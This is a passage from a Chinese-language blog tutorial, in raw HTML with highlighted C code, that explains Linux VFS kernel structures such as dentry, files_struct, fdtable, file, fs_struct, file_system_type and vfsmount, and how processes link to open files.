class="title">d_subdirs</span>;</span><span class="comment">/* our children */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_alias</span>;</span><span class="comment">/* inode alias list */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> d_time;<span class="comment">/* 重置时间 used by d_revalidate */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">d_op</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">d_sb</span>;</span><span class="comment">/* The root of the dentry tree */</span></span><br><span class="line"><span class="type">void</span> *d_fsdata;<span class="comment">/* fs-specific data */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PROFILING</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dcookie_struct</span> *<span class="title">d_cookie</span>;</span> <span class="comment">/* cookie, if any */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> d_mounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> d_iname[DNAME_INLINE_LEN_MIN];<span class="comment">/* small names */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​来看几个比较重要的表项：</p><ul><li><p><code>atomic_t d_count;</code>：引用计数。</p><ul><li><p>对于普通文件，互为硬链接的 n 个文件的 d_count 均为 n，当删除某个文件时，所有硬链接文件的 d_count 均减 1，若 d_count 减为 0 则可以释放该 dentry 结构体和对应的 inode ，否则只可释放 dentry。</p></li><li><p>对于目录文件，不可通过 ln 命令来创建硬链接，但其本身却有硬链接，用 d_count 表示，通过<code>ls -l</code>命令可查看。假设有这样的目录树</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/</span><br><span class="line">|-- file</span><br><span class="line">| |-- test</span><br><span class="line">| |   |-- a.txt</span><br><span class="line">| |   |-- b.txt</span><br><span class="line">| |   |-- f1</span><br><span class="line">| |   |-- f2</span><br></pre></td></tr></table></figure><p>对于 test 目录而言有 4 个硬链接数，1. 通过<code>cd /file/test</code>可进入该目录；2. 通过同级的<code>cd .</code>可进入该目录；3. 通过下级的 f1 文件<code>cd ..</code>可返回该目录；4. 通过下级的 f2 文件<code>cd ..</code>可返回该目录；因此我们也可总结出：一个目录文件的硬链接数至少为2。</p></li></ul></li><li><p><code>struct inode *d_inode;</code>：指向其对应的索引节点 inode。</p></li><li><p><code>unsigned int d_flags; </code>：状态位。有三种状态：</p><ul><li>被使用：意味着它正在被 VFS 使用并指向一个有效的索引节点 inode。（d_inode 有效，d_count &gt;&#x3D; 1）</li><li>未被使用：指向一个有效的索引节点 inode，但 VFS 未使用（d_count &#x3D;&#x3D; 0）。若以后需要则可不必再创建 dentry，但若需回收内存则可撤销该 dentry。</li><li>负状态：无对应索引节点 inode（d_inode &#x3D;&#x3D; NULL），由于索引节点被删除或目录不在正确时导致。</li></ul></li><li><p><code>struct hlist_node d_hash; </code>：哈希链表节点，dentry 被放在哈希链表 dentry_cache 上，方便寻找。</p></li><li><p><code>struct dentry *d_parent; </code>：父目录指针。</p></li><li><p><code>struct qstr d_name;</code>：文件或者是目录的名字。</p></li><li><p><code>struct list_head d_lru; </code>：lru链表。</p></li><li><p><code>union&#123; struct list_head d_child;&#125;</code>：父目录中指向子目录的指针（即兄弟项指针）。</p></li><li><p><code>struct list_head d_subdirs;</code>：子目录链表。</p></li><li><p><code>struct list_head d_alias; </code>：索引节点别名链表。</p></li><li><p><code>struct dentry_operations *d_op;</code>：目录项操作函数指针。包含<code>(*d_hash)</code>，<code>(*d_delete)</code>，<code>(*d_release)</code>等操作。</p></li><li><p><code>struct super_block *d_sb;</code>：所属超级块。</p></li></ul><p>​既然这里我们这里谈的是文件在内存中的组织形式，当然也就少不了谈起和进程的关系，毕竟操作文件的主体肯定是进程而不是空气。与此相关联的我们要看三个结构体：<code>struct file</code>，<code>struct files_struct</code>以及<code>struct fs_struct</code>。</p><p>​我们从前往后看，首先我们知道 Linux 下描述进程的结构体是 task_struct （如果对这个还不了解的话先去搜一搜进程控制块和 task_struct 的概念），在 task_struct 里有一项 <code>struct files_struct *files;</code>，其指向描述本进程的打开文件表，注意，这描述的是进程打开的所有文件的总表，其中有一项为 <code>struct file ** fd;</code>，它是一个指针数组，数组的每一项指向一个打开的文件对象结构体，也就是我们要谈到的<code>struct file</code>，它针对的是单个文件。而对一个文件来说，我们便不难猜到了，<code>struct file</code>里有一项为<code>struct dentry *f_dentry;</code>，这就是指向该文件的 dentry 结构体的成员，这样，我们的知识便串联了起来。</p><p>​此外，上面的 file 和 files_struct 记录的都是进程打开的文件信息，但是对于进程来说，自身的一些信息用什么表示呢，这里就涉及到 fs_struct 结构体。比如我们在 <code>/home/bingbing/code1</code>下执行<code>./a.out</code>，那么作为进程的执行文件<code>a.out</code>本身也需要描述，这就是 task_struct 里的<code>struct fs_struct *fs</code>，其指向一个 fs_struct 结构体，fs_struct 里的比如<code>struct dentry * pwd;</code>描述的便是进程当前的执行目录的 dentry。这样，我们就把这几个结构体讲完了。来看看，千言万语汇成一幅图：</p><p><img src="https://s2.loli.net/2023/01/17/sAoiTm9Ctv2Pk4r.jpg" alt="P_WCNS_1@_A~G4C@BPAX_KS.jpg"></p><h2 id="用户打开文件表（files-struct）"><a href="#用户打开文件表（files-struct）" class="headerlink" title="用户打开文件表（files_struct）"></a>用户打开文件表（files_struct）</h2><p>​当我们创建文件时，操作系统会为指向该文件的指针 FILE* 关联一个文件描述符 fd 并添加在文件描述符表中。在文件描述符表中 fd 相当于数组的索引。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> count;</span><br><span class="line">    <span class="type">rwlock_t</span> file_lock; <span class="comment">/*保护以下的所有域,以免在 tsk-&gt;alloc_lock 中的嵌套*/</span></span><br><span class="line">    <span class="type">int</span> next_fd;<span class="comment">/*已分配的最大文件描述符+1*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span>  <span class="title">fdtab</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">embedded_fd_set</span> <span class="title">close_on_exec_init</span>;</span> <span class="comment">/*执行exec( )时需要关闭的文件描述符的初值集合*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">embedded_fd_set</span> <span class="title">open_fds_init</span>;</span><span class="comment">/*文件描述符的初值集合*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">fd_array</span>[<span class="title">NR_OPEN_DEFAULT</span>];</span><span class="comment">/*文件对象指针数组*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​下面有一些比较重要的成员。</p><ul><li><code>atomic_t count;</code>是引用计数，表示共享该表的进程数。</li><li><code>int next_fd;</code>：已分配的最大文件描述符+1，即下一个可用的 fd。</li><li><code>struct fdtable *fdt</code>： 指向其他 fd 表的指针。</li><li><code>struct fdtable fdtab</code>： 基 fd 表。</li><li><code>struct file *fd_array[NR_OPEN_DEFAULT];</code>：缺省的文件对象数组。</li></ul><p>​<code>fd_array[NR_OPEN_DEFAULT]</code> 数组中存储了 <code>struct file *</code>类型的数据，也就是指向已打开的文件对象，其中的宏<code>NR_OPEN_DEFAULT</code>定义等于计算机位数，在64位机器上为64，换句话说，一个进程的 <code>files_struct</code> 结构体最多能打开64个文件对象，大家肯定就会问，那超过64个怎么办呢？没错，这时候就需要用到 <code>fdtable</code> 了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_fds;<span class="comment">/*当前文件对象的最大数*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> __<span class="title">rcu</span> **<span class="title">fd</span>;</span>      <span class="comment">/* current fd array */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *close_on_exec;<span class="comment">/*指向 执行exec( )时需要关闭的文件描述符*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *open_fds;<span class="comment">/*指向 打开的文件描述符*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *full_fds_bits;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​从<code>struct fdtable</code>的源代码里可以看到该结构体内最值得关注的是<code>struct file __rcu **fd;</code>，这是一个二级指针，也就是说它是一个指针，它指向的对象的数据类型为<code>struct file *</code>，也就是对应的文件对象指针，实际上就是指向我们前面提到的<code>struct file *fd_array[NR_OPEN_DEFAULT];</code>这个成员（而我们通常提到的文件描述符 fd 其实就是该数组的下标索引，因此每个进程的文件描述符相互独立存在）。看一下下面这个图（红色和蓝色箭头表示指针，而灰色虚线表示展开某成员的细节）。</p><blockquote><p>小补充：<code>struct file __rcu **fd;</code>里的 _rcu 是什么? 参考：<a href="https://zhuanlan.zhihu.com/p/113999842">rcu 机制简介 - 知乎</a></p></blockquote><p><img src="https://s2.loli.net/2023/01/17/rdngluIqtKZ3HT7.png" alt="image.png"></p><p>​对于以上的描述，我们可以来看一看对于内核第一个进程(即进程 init )的 <code>files_struct</code> 静态初始化代码，注意第 2 行和第 6 行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> <span class="title">init_files</span> =</span> &#123;</span><br><span class="line">    .count      = ATOMIC_INIT(<span class="number">1</span>),</span><br><span class="line">    .fdt        = &amp;init_files.fdtab,</span><br><span class="line">    .fdtab      = &#123;</span><br><span class="line">        .max_fds        = NR_OPEN_DEFAULT,</span><br><span class="line">        .fd               = &amp;init_files.fd_array[<span class="number">0</span>],</span><br><span class="line">        .close_on_exec  = (fd_set *)&amp;init_files.close_on_exec_init,</span><br><span class="line">        .open_fds       = (fd_set *)&amp;init_files.open_fds_init,</span><br><span class="line">        .rcu            = RCU_HEAD_INIT,</span><br><span class="line">    &#125;,</span><br><span class="line">    .file_lock  = __SPIN_LOCK_UNLOCKED(init_task.file_lock),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​这样一看大家问题就来了，感觉 <code>struct fdtable fdtab</code>没有存在的意义呀，即使去除该结构，也足以表达<code>files_struct</code>。注意，咱们前面说了，64位机<code>file_array</code>至多能存64个文件对象，当进程打开的文件数超过 64 时，操作系统就会新建一个<code>struct fdtable</code>（假定命名为 fdt1）以及一个<code>file_array</code>数组，而此时我们的<code>files_struct</code>里的<code>struct fdtable *fdt;</code>便会指向这个新表<code>fdt1</code>，此时<code>fdt1</code>的<code>struct file __rcu **fd;</code>成员就不是没有意义了，它会指向那块新建的 <code>file_array</code>数组，自此，这些所有的文件对象指针就能被串联起来了。如下图所示。</p><p><img src="https://s2.loli.net/2023/01/17/Qlz4bckN5hrTHPg.png" alt="image.png"></p><h2 id="文件对象（file）"><a href="#文件对象（file）" class="headerlink" title="文件对象（file）"></a>文件对象（file）</h2><p>​<code>files_struct</code>结构体表征的是进程打开的所有文件的集合描述，而该 <code>file</code>结构体则是对单个被打开文件的文件的描述，也称为‘’文件对象‘’。该对象由相应的 open() 系统调用创建，由 close() 撤销。由于多个进程可以同时打开同一个物理文件，因此同一个磁盘文件可以对应多个文件对象，下面来看一下<code>struct file</code>的定义，其位于<code>linux/fs.h</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">    <span class="comment">// fu_list becomes invalid after file_free is called and queued via</span></span><br><span class="line">    <span class="comment">// fu_rcuhead for RCU freeing</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">fu_list</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>     <span class="title">fu_rcuhead</span>;</span><span class="comment">//与 rcu 机制有关，前面有链接</span></span><br><span class="line">    &#125; f_u;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">path</span>     <span class="title">f_path</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> f_dentry    f_path.dentry</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> f_vfsmnt    f_path.mnt</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>    *<span class="title">f_op</span>;</span></span><br><span class="line">    <span class="type">spinlock_t</span>      f_lock;  <span class="comment">/* f_ep_links, f_flags, no IRQ */</span></span><br><span class="line">    <span class="type">atomic_long_t</span>       f_count;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        f_flags;</span><br><span class="line">    <span class="type">fmode_t</span>         f_mode;</span><br><span class="line">    <span class="type">loff_t</span>          f_pos;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>  <span class="title">f_owner</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>   *<span class="title">f_cred</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>    <span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">    u64         f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>            *f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">    <span class="type">void</span>            *private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">    <span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">f_ep_links</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    *<span class="title">f_mapping</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_WRITECOUNT</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> f_mnt_write_state;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​下面来看几个比较重要的成员：</p><ul><li><p><code>struct list_head    fu_list;</code>：文件对象链表，所有文件对象被串起来方便遍历和查找。</p></li><li><p><code>struct path     f_path;</code>：描述文件对象的路径，其中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> *<span class="title">mnt</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>struct vfsmount *mnt;</code>时和挂载点有关的结构体，后面有介绍，<code>struct dentry *dentry;</code>则是指向该文件对象的 dentry 。</p></li><li><p><code>const struct file_operations    *f_op;</code>：同样的，指文件对象的操作函数指针，包含<code>(*read)</code>，<code>(*write)</code>，<code>(*open)</code>，<code>(*llseek)</code>等我们非常熟悉的文件操作。</p></li><li><p><code>atomic_long_t       f_count;</code>：文件对象引用计数，即当前有多少个进程在使用该文件。</p></li><li><p><code>unsigned int        f_flags;</code>：打开文件时所指定的标志。</p></li><li><p><code>fmode_t         f_mode;</code>：文件访问模式，如只读，只写等，掩码表示。</p></li><li><p><code>loff_t          f_pos;</code>：文件当前的位移量（文件指针）。</p></li><li><p><code>struct fown_struct  f_owner;</code>：文件所有者信息，包含 uid，gid等。</p></li><li><p><code>struct inode    *f_inode;</code>：通常我们认为 file 文件对象需要通过 dentry 才能找到对应的 inode，但当今的 Linux 实现或也有此成员，可快速找到作为 cached value 的 inode结构体。</p></li></ul><p>​不难发现，文件对象并不记录文件是否为脏等标志，因为文件对象并没有对应的磁盘数据。文件对象通过 f_dentry 指针找到对应的 dentry 结构体，再找到 inode 节点，而我们前面已经看到，在 inode 里记录着最后一次访问，修改文件，修改 inode 时间，以决定是否回写进磁盘。</p><p>​在 Linux 中，系统会为每个进程打开三个默认文件，即标准输入 STDIN_FILENO，标准输出 STDOUT_FILENO以及标准错误 STDERR_FILENO，因此当我们的进程打开一个自己的文件时，系统为指向该文件的指针 FILE* 关联一个文件描述符并添加在文件描述符表中，这个描述符一般就从 3 开始了。</p><p><img src="https://s2.loli.net/2023/01/18/9kfFGxYRzHgMhsU.png" alt="image.png"></p><h2 id="fs-strucut"><a href="#fs-strucut" class="headerlink" title="fs_strucut"></a>fs_strucut</h2><p>​除了前面提到的进程打开的文件之外，每个进程也都有自己的根目录和当前工作目录，内核使用<code>struct fs_struct</code>来记录这些信息，进程描述符 <code>task_struct</code>的 fs 字段便是指向该进程的 <code>fs_struct</code> 结构。这个结构体就很简单了，下面来看一下定义，存在于<code>/linux/fs_struct.h</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> count;</span><br><span class="line">    <span class="type">int</span> users;<span class="comment">//暂时不清楚</span></span><br><span class="line">    <span class="type">spinlock_t</span> lock;<span class="comment">/*保护该结构体的锁*/</span></span><br><span class="line">    <span class="type">seqcount_t</span> seq;</span><br><span class="line">    <span class="type">int</span> umask;</span><br><span class="line">    <span class="type">int</span> in_exec;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">root</span>, <span class="title">pwd</span>, <span class="title">altroot</span>;</span></span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><ul><li><code>int umask;</code>：文件访问权限掩码表示，由 umask() 系统调用使用。</li><li><code>atomic_t count;</code>：引用计数，表示共享该表的进程（线程）数。</li><li><code>struct path root, pwd, altroot;</code>：<code>path</code>结构体前面已经提到了，这三个成员就记录了该进程执行目录，进程根目录，用户设置的替换目录 所指向的 dentry 目录项对象。</li></ul><p>​到这里我们就分析完所有我们前面所提到的结构体了，友友们应该也对文件系统体系有了一个框架性的认识，下图总结了这几个重要结构体之间的关系。</p><p><img src="https://s2.loli.net/2023/01/18/NUywPjBTEYSWiaV.png" alt="image.png"></p><h1 id="和文件系统相关的其他标准结构"><a href="#和文件系统相关的其他标准结构" class="headerlink" title="和文件系统相关的其他标准结构"></a>和文件系统相关的其他标准结构</h1><p>​除了以上几种 VFS 架构的基础对象之外，内核还使用了另外一些标准数据结构来管理文件系统的其他相关数据。</p><h2 id="文件系统类型（file-system-type）"><a href="#文件系统类型（file-system-type）" class="headerlink" title="文件系统类型（file_system_type）"></a>文件系统类型（file_system_type）</h2><p>​在前面的超级块<code>struct super_block</code>里，有一个成员是<code>struct file_system_type   *s_type;</code>表示文件系统类型结构体（比如是 EXT2 还是 FAT32），里边是对文件系统的细节描述。因此<code>file_system_type</code>结构用于描述具体的文件系统的类型信息。被 Linux 支持的文件系统，不管它有零个或多个实例被安装到系统中，同类型的文件系统都有且仅有一 个<code>file_system_type</code>结构，其定义于<code>linux/fs.h</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> &#123;</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line"><span class="type">int</span> fs_flags;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> (*get_sb) (<span class="keyword">struct</span> file_system_type *, <span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> *, <span class="type">void</span> *, <span class="keyword">struct</span> vfsmount *);</span><br><span class="line">    <span class="type">void</span> (*kill_sb) (<span class="keyword">struct</span> super_block *);</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> * <span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">fs_supers</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 锁相关</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_lock_key</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_umount_key</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_vfs_rename_key</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_writers_key</span>[<span class="title">SB_FREEZE_LEVELS</span>];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_lock_key</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_mutex_key</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_mutex_dir_key</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>const char *name;</code>：文件系统名称。</li><li><code>int fs_flags;</code>：文件系统类型标志的 bitmap。</li><li><code>int (*get_sb) (xx)</code>：方法，安装文件时会调用 <code>get_sb()</code> 从磁盘中读取超级块。</li><li><code> void (*kill_sb) (struct super_block *);</code>方法，卸载文件系统时会调用此函数做一些清理工作。</li><li><code>struct module *owner;</code>：文件系统模块。</li><li><code>struct file_system_type * next;</code>：指向下一个文件系统类型的<code>file_system_type </code>结构体。</li><li><code>struct hlist_head fs_supers;</code>：同一种文件类型的超级块形成一个链表，<code>fs_supers</code> 是这个链表的头。</li></ul><p>​   不同类型的文件系统通过 <code>next</code> 字段形成一个链表，同一种文件系统类型的超级块通过 <code>s_instances</code> 字段连接在一起，并挂入 <code>fs_supers</code> 链表中。所有的 vfsmount 通过 mnt_list 字段形成一个链表。</p><h2 id="安装点（vfsmount）"><a href="#安装点（vfsmount）" class="headerlink" title="安装点（vfsmount）"></a>安装点（vfsmount）</h2><p>​<code>file_system_type</code>结构用于描述具体的文件系统的类型信息，而<code>vfsmount</code>便是某个文件系统的具体实例。例如 EXT2 类型的文件系统有 5 个，那么<code>file_system_type</code>结构体只有一个，描述 EXT2 信息，而<code>vfsmount</code>会被创建五个，用于描述安装的每一个 EXT2 实例，也被称为安装点，定义于<code>linux/mount.h</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_hash</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> *<span class="title">mnt_parent</span>;</span><span class="comment">/* fs we are mounted on */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">mnt_mountpoint</span>;</span><span class="comment">/* dentry of mountpoint */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">mnt_root</span>;</span><span class="comment">/* root of the mounted tree */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">mnt_sb</span>;</span><span class="comment">/* pointer to superblock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_mounts</span>;</span><span class="comment">/* list of children, anchored here */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_child</span>;</span><span class="comment">/* and going through their mnt_child */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 安装标志 */</span></span><br><span class="line"><span class="type">int</span> mnt_flags;</span><br><span class="line"><span class="comment">/* 挂载的设备名字，如/dev/dsk/hda1 */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *mnt_devname;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 虚拟文件系统命名空间中的链表节点 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_expire</span>;</span><span class="comment">/* link in fs-specific expiry list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_share</span>;</span><span class="comment">/* circular list of shared mounts */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_slave_list</span>;</span><span class="comment">/* list of slave mounts */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_slave</span>;</span><span class="comment">/* slave list entry */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> *<span class="title">mnt_master</span>;</span><span class="comment">/* slave is on master-&gt;mnt_slave_list */</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 所在的虚拟文件系统命名空间*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mnt_namespace</span> *<span class="title">mnt_ns</span>;</span><span class="comment">/* 